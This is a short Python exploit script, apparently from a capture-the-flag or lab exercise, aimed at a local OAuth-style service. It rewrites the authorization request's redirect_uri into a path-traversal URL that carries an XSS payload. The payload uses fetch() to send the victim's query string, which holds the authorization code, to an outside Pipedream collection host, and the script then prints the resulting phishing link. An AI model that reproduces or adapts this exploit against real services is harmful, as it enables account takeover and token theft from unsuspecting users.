import requests
import urllib

session = requests.session()
attacker_server = 'https://eou3mkkpfovjhx8.m.pipedream.net'
dest = f'http://localhost:10000/callback/../test?name=<script>fetch(`{attacker_server}?search=${{location.search}}`)</script>'

# login as attacker
payload = {'name': 'bob', 'password': 'hoge'}
res = session.post('http://localhost:10000/login', data=payload)

# authorize request
res = session.get('http://localhost:10000/authorize', allow_redirects=False)
pr = urllib.parse.urlparse(res.headers['Location'])
qs_d = urllib.parse.parse_qs(pr.query)
qs_d['redirect_uri'] = [dest]
url = urllib.parse.urlunparse(pr._replace(netloc='localhost:10001', query=urllib.parse.urlencode(qs_d, doseq=True)))
print("Fishing URL:", url)